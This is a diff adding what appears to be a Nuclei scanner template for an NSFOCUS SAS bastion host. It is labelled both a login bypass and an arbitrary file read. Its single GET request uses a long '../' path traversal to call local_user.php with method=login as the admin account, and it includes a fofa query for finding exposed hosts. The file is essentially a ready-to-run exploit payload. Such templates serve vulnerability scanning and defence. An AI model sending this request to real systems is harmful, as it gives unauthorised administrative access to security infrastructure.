@@ -1,0 +1,26 @@
+id: Nsfocus-SAS_login-bypass_webconf
+
+info:
+  name: Nsfocus-SAS_login-bypass_webconf
+  author: hufei
+  severity: critical
+  description: |
+     绿盟堡垒机存在任意文件读取漏洞
+  reference:
+  metadata:
+    max-request: 3
+    fofa-query: title=="NSFOCUS&nbsp;SAS[H]"
+  tags: Nsfocus-SAS,login-bypass,intrusive
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"status":200}'
+
